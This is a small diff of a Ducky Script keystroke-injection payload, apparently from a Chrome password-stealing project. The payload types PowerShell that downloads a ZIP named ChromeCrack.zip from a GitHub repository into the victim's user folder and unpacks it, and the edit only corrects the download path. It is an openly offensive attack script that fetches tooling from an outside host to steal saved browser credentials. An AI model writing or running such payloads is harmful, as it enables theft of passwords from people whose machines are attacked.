@@ -33,7 +33,7 @@ DELAY 800
 STRING $b = $c.Trim()
 ENTER
 DELAY 800
-STRING Invoke-WebRequest -Uri 'https://github.com/lucianchauvin/ChromePasswordYoinker/raw/master/ChromeCrack.zip' -OutFile "$b\Users\$env:UserName\ChromeCracker.zip"
+STRING Invoke-WebRequest -Uri 'https://github.com/lucianchauvin/ChromePasswordYoinker/raw/master/ChromeCrack.zip' -OutFile "C:\Users\$env:UserName\ChromeCracker.zip"
 ENTER
 DELAY 800
 STRING Expand-Archive C:\Users\$env:UserName\ChromeCracker.zip -DestinationPath C:\Users\$env:UserName\ChromeCracker -Force
